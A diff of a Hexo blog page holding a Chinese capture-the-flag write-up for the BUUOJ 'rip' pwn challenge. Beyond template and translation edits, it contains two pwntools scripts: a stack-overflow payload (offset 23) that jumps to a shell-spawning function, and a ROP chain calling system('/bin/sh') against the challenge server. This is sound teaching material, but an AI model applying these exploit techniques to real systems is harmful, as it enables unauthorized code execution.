@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息                                                                                                            64位elf，简单输入，保护基本没开 静态分析IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以">
+    <meta name="description" content="题目信息 64位elf，简单输入，保护基本没开 静态分析IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以   动态分析gdb简单看一下，offset23，fun地址0x401186  exploit1234567891011121314from pwn import *sh &#x3D; remote(&#39;node3.buuoj.cn&#39;, 28896)# sh &#x3D;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buuoj-pwn-rip">
 <meta property="og:url" content="https://darkwing.moe/2019/10/29/buuoj-pwn-rip/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息                                                                                                            64位elf，简单输入，保护基本没开 静态分析IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以">
+<meta property="og:description" content="题目信息 64位elf，简单输入，保护基本没开 静态分析IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以   动态分析gdb简单看一下，offset23，fun地址0x401186  exploit1234567891011121314from pwn import *sh &#x3D; remote(&#39;node3.buuoj.cn&#39;, 28896)# sh &#x3D;">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102303.jpg">
@@ -117,8 +117,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -140,7 +147,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -207,60 +214,18 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102301.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+            <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102301.jpg" alt=""></p>
 <p>64位elf，简单输入，保护基本没开</p>
 <h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102302.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102303.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102302.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102303.jpg" alt=""></p>
 <h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><p>gdb简单看一下，offset23，fun地址0x401186</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102304.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102304.jpg" alt=""></p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28896</span>)</span><br><span class="line"><span class="comment"># sh = process('./pwn1')</span></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">fun_addr = <span class="number">0x401186</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span>+ p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>另外一种方式，手动构造ROP：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102305.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102306.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102305.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019102306.jpg" alt=""></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28225</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fun_addr = 0x401186</span></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"system"</span>])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -271,7 +236,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-29T05:07:28.915Z" itemprop="dateUpdated">2019-10-29 13:07:28</time>
+    Last updated: <time datetime="2019-10-29T05:07:28.915Z" itemprop="dateUpdated">2019-10-29 13:07:28</time>
 </span><br>
 
 
@@ -438,11 +403,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
